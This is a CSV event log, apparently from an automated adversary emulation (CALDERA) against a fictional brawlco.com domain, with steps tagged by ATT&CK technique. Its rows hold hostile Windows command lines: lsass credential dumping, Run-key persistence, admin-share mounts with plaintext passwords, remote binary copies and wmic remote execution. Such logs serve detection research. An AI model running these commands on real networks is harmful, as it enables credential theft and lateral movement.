action,fqdn,id,pid,happened_before,happened_after,nodetype,object,ppid,host,command_line,step,file_path,actor_pid,events,attack_info,data,key,value
create,sounder-pc.brawlco.com,d17ca957-5675-404b-8b18-2bc800d16faa,2720.0,2017-05-01T18:59:03.361000+00:00,2017-05-01T18:58:54.895000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,0,,,,,,,
open,sounder-pc.brawlco.com,8e1f473b-869f-4cea-82d8-04e0901cd837,,2017-05-01T18:59:03.361000+00:00,2017-05-01T18:58:54.895000+00:00,event,process,,sounder-pc.brawlco.com,,1,C:\Windows\System32\lsass.exe,2720.0,,,,,
,,114da984-d6d5-43c3-9929-9f2d7423259b,,,,step,,,,,2,,,"['d17ca957-5675-404b-8b18-2bc800d16faa', '8e1f473b-869f-4cea-82d8-04e0901cd837']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,sounder-pc.brawlco.com,f7094777-da91-4150-9910-20e014fa5295,32.0,2017-05-01T18:59:04.073000+00:00,2017-05-01T18:59:03.959000+00:00,event,process,3468.0,sounder-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\and.exe /f,3,,,,,,,
add,sounder-pc.brawlco.com,31fa6b6b-a292-4b6d-a6ed-e228301bfa4d,,2017-05-01T18:59:04.232000+00:00,2017-05-01T18:59:03.935000+00:00,event,registry,,sounder-pc.brawlco.com,,4,,,,,C:\and.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,3d082397-8121-43da-b6d3-2c76775af927,,,,step,,,,,5,,,"['f7094777-da91-4150-9910-20e014fa5295', '31fa6b6b-a292-4b6d-a6ed-e228301bfa4d']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,sounder-pc.brawlco.com,e9f63d9e-5fba-49a3-8970-651f95cf394c,1396.0,2017-05-01T18:59:08.528000+00:00,2017-05-01T18:59:04.365000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,6,,,,,,,
,,7f9cf050-1193-4219-9060-ea39d6259567,,,,step,,,,,7,,,['e9f63d9e-5fba-49a3-8970-651f95cf394c'],"[{'technique_name': 'Remote System Discovery', 'technique_id': 'T1018', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,d7552bbd-08ca-424c-85ee-4ed174da1255,2088.0,2017-05-01T18:59:10.012000+00:00,2017-05-01T18:59:09.836000+00:00,event,process,3468.0,sounder-pc.brawlco.com,nbtstat -n,8,,,,,,,
,,8232b8f1-286a-4dbc-9286-d300a1e29b45,,,,step,,,,,9,,,['d7552bbd-08ca-424c-85ee-4ed174da1255'],"[{'technique_name': 'Local Network Configuration Discovery', 'technique_id': 'T1016', 'tactic': ['Discovery']}]",,,
create,sounder-pc.brawlco.com,baa2a199-3ada-476a-b1f5-e0d707bb52ea,1440.0,2017-05-01T18:59:15.051000+00:00,2017-05-01T18:59:10.355000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,10,,,,,,,
,,6c647caf-fb40-40df-9d8f-e433279d1f62,,,,step,,,,,11,,,['baa2a199-3ada-476a-b1f5-e0d707bb52ea'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,63aa9d37-7d34-4440-9f3d-eea3e783e1f9,2940.0,2017-05-01T18:59:19.885000+00:00,2017-05-01T18:59:15.939000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,12,,,,,,,
,,0f087258-c27c-40d1-925b-16623ae65849,,,,step,,,,,13,,,['63aa9d37-7d34-4440-9f3d-eea3e783e1f9'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,60d8b8a6-e22a-42c9-b149-977990a36c24,2640.0,2017-05-01T18:59:24.497000+00:00,2017-05-01T18:59:20.530000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,14,,,,,,,
,,d40eaaaf-4b08-48ce-8198-2b8b795d6583,,,,step,,,,,15,,,['60d8b8a6-e22a-42c9-b149-977990a36c24'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,37e8201d-4741-4225-89bc-ab6ad4291214,3656.0,2017-05-01T18:59:29.225000+00:00,2017-05-01T18:59:25.220000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,16,,,,,,,
,,e81fd66f-5489-4df6-aafc-7747095ed96a,,,,step,,,,,17,,,['37e8201d-4741-4225-89bc-ab6ad4291214'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,38eb69ce-214d-4662-b6f0-6e425d3e8878,1636.0,2017-05-01T18:59:33.948000+00:00,2017-05-01T18:59:30.050000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,18,,,,,,,
,,05689448-8d66-4a3d-a344-64473d6616e9,,,,step,,,,,19,,,['38eb69ce-214d-4662-b6f0-6e425d3e8878'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,f1bbc2e0-b2b1-448d-b129-9db6c1b2af21,164.0,2017-05-01T18:59:38.715000+00:00,2017-05-01T18:59:34.782000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,20,,,,,,,
,,4cd5de25-83fa-4e5a-91f9-208f0269cdd8,,,,step,,,,,21,,,['f1bbc2e0-b2b1-448d-b129-9db6c1b2af21'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,4ce3a096-9f03-4461-82bb-0cf643355394,1224.0,2017-05-01T18:59:43.392000+00:00,2017-05-01T18:59:39.512000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,22,,,,,,,
,,57235e54-0ced-42c0-97a2-31e147df70fb,,,,step,,,,,23,,,['4ce3a096-9f03-4461-82bb-0cf643355394'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,ff3fda01-8ce2-4248-8e24-6950c483cabf,4012.0,2017-05-01T18:59:48.528000+00:00,2017-05-01T18:59:44.311000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,24,,,,,,,
,,bef5bdff-cadb-44e2-89bc-7cf16f76570f,,,,step,,,,,25,,,['ff3fda01-8ce2-4248-8e24-6950c483cabf'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,611becec-6ac9-4e1f-a32f-f89514a4830e,216.0,2017-05-01T18:59:53.319000+00:00,2017-05-01T18:59:49.396000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,26,,,,,,,
,,92ed6d30-7446-4abd-b013-0226443b6a4f,,,,step,,,,,27,,,['611becec-6ac9-4e1f-a32f-f89514a4830e'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,44164ec1-8fed-47df-aa87-8b68bc3a30e7,2364.0,2017-05-01T18:59:58.280000+00:00,2017-05-01T18:59:54.213000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,28,,,,,,,
,,015e0d5d-b52f-4d25-b6af-0a66973251d7,,,,step,,,,,29,,,['44164ec1-8fed-47df-aa87-8b68bc3a30e7'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,28d43ea8-6263-4c89-aac5-f6ade8df9a39,3348.0,2017-05-01T19:00:03.230000+00:00,2017-05-01T18:59:59.300000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,30,,,,,,,
,,0f14e5c0-04c3-4892-8551-08652e0bfba1,,,,step,,,,,31,,,['28d43ea8-6263-4c89-aac5-f6ade8df9a39'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,ac7d0d63-df54-4f95-ad3b-23b5f0148ca9,3896.0,2017-05-01T19:00:08.208000+00:00,2017-05-01T19:00:04.336000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,32,,,,,,,
,,53cc1f02-dd63-426a-bbae-dee77999b07f,,,,step,,,,,33,,,['ac7d0d63-df54-4f95-ad3b-23b5f0148ca9'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,5402083f-b496-4e3c-9f0a-95ec37299c0c,3176.0,2017-05-01T19:00:13.653000+00:00,2017-05-01T19:00:09.333000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,34,,,,,,,
,,c4acd27a-ae29-4175-8820-7848e89c3706,,,,step,,,,,35,,,['5402083f-b496-4e3c-9f0a-95ec37299c0c'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,39ac5f7b-4698-465e-88b3-6d8a0478122a,1176.0,2017-05-01T19:00:18.597000+00:00,2017-05-01T19:00:14.684000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,36,,,,,,,
,,0b206cbf-d5dd-4222-8b43-c445ae948ed1,,,,step,,,,,37,,,['39ac5f7b-4698-465e-88b3-6d8a0478122a'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,6b670986-3f70-4e9e-9498-47999782ba80,2960.0,2017-05-01T19:00:23.682000+00:00,2017-05-01T19:00:19.693000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,38,,,,,,,
,,288f03da-03c3-49d3-98cb-7f14825d5a7c,,,,step,,,,,39,,,['6b670986-3f70-4e9e-9498-47999782ba80'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,2e429ceb-c7ae-4c62-98c6-1a5ad423ec95,2636.0,2017-05-01T19:00:28.577000+00:00,2017-05-01T19:00:24.751000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,40,,,,,,,
,,807723af-fdaf-4ecd-8cbc-6ce80116f280,,,,step,,,,,41,,,['2e429ceb-c7ae-4c62-98c6-1a5ad423ec95'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,2c17b194-d5e6-4ef4-8f6d-1544f4ef45a0,1092.0,2017-05-01T19:00:33.558000+00:00,2017-05-01T19:00:29.628000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,42,,,,,,,
,,78f17f99-9d94-4624-98e9-4b065844113b,,,,step,,,,,43,,,['2c17b194-d5e6-4ef4-8f6d-1544f4ef45a0'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,b0f75da2-bdab-414b-b6ac-3ad7011ce826,4000.0,2017-05-01T19:00:38.623000+00:00,2017-05-01T19:00:34.742000+00:00,event,process,3468.0,sounder-pc.brawlco.com,powershell -command -,44,,,,,,,
,,32b2da43-8027-4f3f-b278-550ad7066085,,,,step,,,,,45,,,['b0f75da2-bdab-414b-b6ac-3ad7011ce826'],"[{'technique_name': 'Permission Groups Discovery', 'technique_id': 'T1069', 'tactic': ['Discovery']}, {'technique_name': 'Account Discovery', 'technique_id': 'T1087', 'tactic': ['Discovery']}, {'technique_name': 'PowerShell', 'technique_id': 'T1086', 'tactic': ['Execution']}]",,,
create,sounder-pc.brawlco.com,b6642b62-0f8d-4a3a-8b99-1e3af9847007,3472.0,2017-05-01T19:00:40.009000+00:00,2017-05-01T19:00:39.824000+00:00,event,process,3468.0,sounder-pc.brawlco.com,net use \\mims-pc.brawlco.com\C$ X#IKwlYrX%X#5 /user:brawlco\cmims,46,,,,,,,
,,90efeb73-3968-4024-be8e-47a9c5d2323d,,,,step,,,,,47,,,['b6642b62-0f8d-4a3a-8b99-1e3af9847007'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,sounder-pc.brawlco.com,be4bf792-8d34-4818-9dd1-9a298352a913,3968.0,2017-05-01T19:00:40.928000+00:00,2017-05-01T19:00:40.738000+00:00,event,process,3468.0,sounder-pc.brawlco.com,"cmd /c copy ""C:\and.exe"" ""\\mims-pc.brawlco.com\C$\raised.exe""",48,,,,,,,
create,mims-pc.brawlco.com,c1a2b7a6-ba29-4029-a57f-c798ddde88c5,,2017-05-01T19:00:41.179000+00:00,2017-05-01T19:00:40.670000+00:00,event,file,,mims-pc.brawlco.com,,49,C:\raised.exe,,,,,,
,,ee5acd52-cd8b-464f-9f8d-0e9cf8794685,,,,step,,,,,50,,,"['be4bf792-8d34-4818-9dd1-9a298352a913', 'c1a2b7a6-ba29-4029-a57f-c798ddde88c5']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,sounder-pc.brawlco.com,32153961-30da-4cfe-9b8c-61a5f890d22e,2116.0,2017-05-01T19:00:42.247000+00:00,2017-05-01T19:00:41.678000+00:00,event,process,3468.0,sounder-pc.brawlco.com,"wmic /node:""mims-pc.brawlco.com"" /user:""brawlco\cmims"" /password:""X#IKwlYrX%X#5"" process call create ""C:\raised.exe -d -f""",51,,,,,,,
,,cebe1c13-947c-44b3-9ad0-d17c5e6e7347,,,,step,,,,,52,,,['32153961-30da-4cfe-9b8c-61a5f890d22e'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,mims-pc.brawlco.com,986d9040-3595-4fb0-9b13-3dcd080807d0,1964.0,2017-05-01T19:00:52.026000+00:00,2017-05-01T19:00:42.980000+00:00,event,process,3764.0,mims-pc.brawlco.com,powershell -command -,53,,,,,,,
open,mims-pc.brawlco.com,4f7c45db-040e-4418-9985-2973e3bba75f,,2017-05-01T19:00:52.026000+00:00,2017-05-01T19:00:42.981000+00:00,event,process,,mims-pc.brawlco.com,,54,C:\Windows\System32\lsass.exe,1964.0,,,,,
,,c7c230d3-d55e-478d-911f-96b4b14bac6e,,,,step,,,,,55,,,"['986d9040-3595-4fb0-9b13-3dcd080807d0', '4f7c45db-040e-4418-9985-2973e3bba75f']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,mims-pc.brawlco.com,28980e59-3b4f-4021-a05e-68f6008218f7,312.0,2017-05-01T19:00:53.575000+00:00,2017-05-01T19:00:53.441000+00:00,event,process,3764.0,mims-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\raised.exe /f,56,,,,,,,
add,mims-pc.brawlco.com,92b28ba1-a6f1-4fca-b510-690393594de7,,2017-05-01T19:00:54.029000+00:00,2017-05-01T19:00:53.367000+00:00,event,registry,,mims-pc.brawlco.com,,57,,,,,C:\raised.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,3c552337-ac89-4960-bb54-ba11bcb6f19f,,,,step,,,,,58,,,"['28980e59-3b4f-4021-a05e-68f6008218f7', '92b28ba1-a6f1-4fca-b510-690393594de7']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,sounder-pc.brawlco.com,a411b87a-423f-4cc2-96cf-f891a0802b70,1792.0,2017-05-01T19:00:54.913000+00:00,2017-05-01T19:00:54.727000+00:00,event,process,3468.0,sounder-pc.brawlco.com,net use \\ostermeyer-pc.brawlco.com\C$ ]ASj3nuafx /user:brawlco\mostermeyer,59,,,,,,,
,,7459b42b-f40a-42f2-b4ed-c955d537dfdc,,,,step,,,,,60,,,['a411b87a-423f-4cc2-96cf-f891a0802b70'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,sounder-pc.brawlco.com,fba22694-20e5-489f-9a09-277f9cee5d95,1296.0,2017-05-01T19:00:58.779000+00:00,2017-05-01T19:00:55.835000+00:00,event,process,3468.0,sounder-pc.brawlco.com,"cmd /c copy ""C:\and.exe"" ""\\ostermeyer-pc.brawlco.com\C$\born.exe""",61,,,,,,,
create,ostermeyer-pc.brawlco.com,019ce0ed-5e71-4267-acd9-8f108f76c2f5,,2017-05-01T19:00:59.149000+00:00,2017-05-01T19:00:55.758000+00:00,event,file,,ostermeyer-pc.brawlco.com,,62,C:\born.exe,,,,,,
,,328ec0f4-a160-4e3f-af65-26b683884c50,,,,step,,,,,63,,,"['fba22694-20e5-489f-9a09-277f9cee5d95', '019ce0ed-5e71-4267-acd9-8f108f76c2f5']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,mims-pc.brawlco.com,10e5c979-b1b3-43f3-b914-dfe796db2bdb,2892.0,2017-05-01T19:01:00.753000+00:00,2017-05-01T19:00:59.792000+00:00,event,process,3764.0,mims-pc.brawlco.com,"wmic /node:""ostermeyer-pc.brawlco.com"" /user:""brawlco\mostermeyer"" /password:""]ASj3nuafx"" process call create ""C:\born.exe -d -f""",64,,,,,,,
,,4e8b04b4-411d-4657-866c-fd37199d65a7,,,,step,,,,,65,,,['10e5c979-b1b3-43f3-b914-dfe796db2bdb'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,ostermeyer-pc.brawlco.com,a3c40bb0-d5ef-4911-80df-9dddd0f18f85,600.0,2017-05-01T19:01:17.768000+00:00,2017-05-01T19:01:02.163000+00:00,event,process,3752.0,ostermeyer-pc.brawlco.com,powershell -command -,66,,,,,,,
open,ostermeyer-pc.brawlco.com,f27f1a7a-eb36-4280-a7d2-fb4bb6799cde,,2017-05-01T19:01:17.768000+00:00,2017-05-01T19:01:02.163000+00:00,event,process,,ostermeyer-pc.brawlco.com,,67,C:\Windows\System32\lsass.exe,600.0,,,,,
,,7e41da92-0a27-45d3-8fbe-1cb04ff8105c,,,,step,,,,,68,,,"['a3c40bb0-d5ef-4911-80df-9dddd0f18f85', 'f27f1a7a-eb36-4280-a7d2-fb4bb6799cde']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,ostermeyer-pc.brawlco.com,7acc55fa-f891-470b-9878-ef57efcd2bc8,3804.0,2017-05-01T19:01:19.956000+00:00,2017-05-01T19:01:19.799000+00:00,event,process,3752.0,ostermeyer-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\born.exe /f,69,,,,,,,
add,ostermeyer-pc.brawlco.com,f5657128-1dc6-41a2-a3cb-5c4747b1a004,,2017-05-01T19:01:20.398000+00:00,2017-05-01T19:01:19.712000+00:00,event,registry,,ostermeyer-pc.brawlco.com,,70,,,,,C:\born.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,9672af36-232d-4e18-9781-e77ba006aa29,,,,step,,,,,71,,,"['7acc55fa-f891-470b-9878-ef57efcd2bc8', 'f5657128-1dc6-41a2-a3cb-5c4747b1a004']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,ostermeyer-pc.brawlco.com,aa39d978-8dd0-4322-b71a-21aac3c00d5e,3984.0,2017-05-01T19:01:21.839000+00:00,2017-05-01T19:01:21.479000+00:00,event,process,3752.0,ostermeyer-pc.brawlco.com,net use \\santilli-pc.brawlco.com\C$ r%Md%1#b5X /user:brawlco\psantilli,72,,,,,,,
,,8900f165-7de4-4e9d-a40f-c173288f8407,,,,step,,,,,73,,,['aa39d978-8dd0-4322-b71a-21aac3c00d5e'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,ostermeyer-pc.brawlco.com,ce4860a2-ada3-4cfc-bf87-604270b647ef,2488.0,2017-05-01T19:01:23.514000+00:00,2017-05-01T19:01:23.160000+00:00,event,process,3752.0,ostermeyer-pc.brawlco.com,"cmd /c copy ""C:\born.exe"" ""\\santilli-pc.brawlco.com\C$\born.exe""",74,,,,,,,
create,santilli-pc.brawlco.com,840e8274-29a7-4114-9e88-31c5de6ad85d,,2017-05-01T19:01:23.833000+00:00,2017-05-01T19:01:23.068000+00:00,event,file,,santilli-pc.brawlco.com,,75,C:\born.exe,,,,,,
,,103c078e-b468-4951-8598-c97fd141b8c7,,,,step,,,,,76,,,"['ce4860a2-ada3-4cfc-bf87-604270b647ef', '840e8274-29a7-4114-9e88-31c5de6ad85d']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,mims-pc.brawlco.com,cdb04625-2e90-4c49-bb4a-e3d4271c63f6,1376.0,2017-05-01T19:01:24.995000+00:00,2017-05-01T19:01:24.551000+00:00,event,process,3764.0,mims-pc.brawlco.com,"wmic /node:""santilli-pc.brawlco.com"" /user:""brawlco\psantilli"" /password:""r%Md%1#b5X"" process call create ""C:\born.exe -d -f""",77,,,,,,,
,,6741d45f-159a-4760-a90c-27208f5d6505,,,,step,,,,,78,,,['cdb04625-2e90-4c49-bb4a-e3d4271c63f6'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,santilli-pc.brawlco.com,f96f2192-299a-4640-a753-020617bbe8c7,3856.0,2017-05-01T19:01:38.013000+00:00,2017-05-01T19:01:26.695000+00:00,event,process,4004.0,santilli-pc.brawlco.com,powershell -command -,79,,,,,,,
open,santilli-pc.brawlco.com,60569aad-ce0f-4c5d-9549-614bff6c7185,,2017-05-01T19:01:38.013000+00:00,2017-05-01T19:01:26.695000+00:00,event,process,,santilli-pc.brawlco.com,,80,C:\Windows\System32\lsass.exe,3856.0,,,,,
,,971030e4-560b-4af7-8fff-0d2d2b7f05b6,,,,step,,,,,81,,,"['f96f2192-299a-4640-a753-020617bbe8c7', '60569aad-ce0f-4c5d-9549-614bff6c7185']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,santilli-pc.brawlco.com,7ed3a7e5-4131-483a-a0e8-0ccd655b2c84,3528.0,2017-05-01T19:01:41.278000+00:00,2017-05-01T19:01:41.114000+00:00,event,process,4004.0,santilli-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\born.exe /f,82,,,,,,,
add,santilli-pc.brawlco.com,ff68ab8c-46e0-4262-890e-0c1fcfa853ed,,2017-05-01T19:01:41.798000+00:00,2017-05-01T19:01:41.020000+00:00,event,registry,,santilli-pc.brawlco.com,,83,,,,,C:\born.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,af2ece44-a2e5-4d90-b12a-03969640896f,,,,step,,,,,84,,,"['7ed3a7e5-4131-483a-a0e8-0ccd655b2c84', 'ff68ab8c-46e0-4262-890e-0c1fcfa853ed']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,mims-pc.brawlco.com,32bc7188-9129-42fd-8f12-e0f940e6345e,1196.0,2017-05-01T19:01:43.948000+00:00,2017-05-01T19:01:43.795000+00:00,event,process,3764.0,mims-pc.brawlco.com,net use \\escue-pc.brawlco.com\C$ ]7s%X.nGkD /user:brawlco\rescue,85,,,,,,,
,,cfa811be-5957-4fdf-b230-f7dc810e66d3,,,,step,,,,,86,,,['32bc7188-9129-42fd-8f12-e0f940e6345e'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,mims-pc.brawlco.com,e7e9e088-5d9c-4e69-ae6b-1e8be2793bdd,3068.0,2017-05-01T19:01:46.530000+00:00,2017-05-01T19:01:46.222000+00:00,event,process,3764.0,mims-pc.brawlco.com,"cmd /c copy ""C:\raised.exe"" ""\\escue-pc.brawlco.com\C$\born.exe""",87,,,,,,,
create,escue-pc.brawlco.com,5bbcd6a0-faec-4d2e-8cec-5fe17a0ec4bb,,2017-05-01T19:01:46.868000+00:00,2017-05-01T19:01:46.115000+00:00,event,file,,escue-pc.brawlco.com,,88,C:\born.exe,,,,,,
,,e4677283-b561-40da-97e1-f49f780fd5c6,,,,step,,,,,89,,,"['e7e9e088-5d9c-4e69-ae6b-1e8be2793bdd', '5bbcd6a0-faec-4d2e-8cec-5fe17a0ec4bb']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,sounder-pc.brawlco.com,97f914c6-a2ae-4dc0-891e-c0b461622724,2720.0,2017-05-01T19:01:48.104000+00:00,2017-05-01T19:01:47.601000+00:00,event,process,3468.0,sounder-pc.brawlco.com,"wmic /node:""escue-pc.brawlco.com"" /user:""brawlco\rescue"" /password:""]7s%X.nGkD"" process call create ""C:\born.exe -d -f""",90,,,,,,,
,,492e750e-b343-4c3b-9cfe-6c5b2072f3c7,,,,step,,,,,91,,,['97f914c6-a2ae-4dc0-891e-c0b461622724'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,escue-pc.brawlco.com,08dea7df-4d2d-4cee-b079-a09179129aa2,3288.0,2017-05-01T19:02:09.241000+00:00,2017-05-01T19:01:51.463000+00:00,event,process,2108.0,escue-pc.brawlco.com,powershell -command -,92,,,,,,,
open,escue-pc.brawlco.com,615e7e78-5873-4531-829b-9b3b08e6ba6d,,2017-05-01T19:02:09.241000+00:00,2017-05-01T19:01:51.464000+00:00,event,process,,escue-pc.brawlco.com,,93,C:\Windows\System32\lsass.exe,3288.0,,,,,
,,c858d693-0d16-4901-a14e-0610ddd1b7e4,,,,step,,,,,94,,,"['08dea7df-4d2d-4cee-b079-a09179129aa2', '615e7e78-5873-4531-829b-9b3b08e6ba6d']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
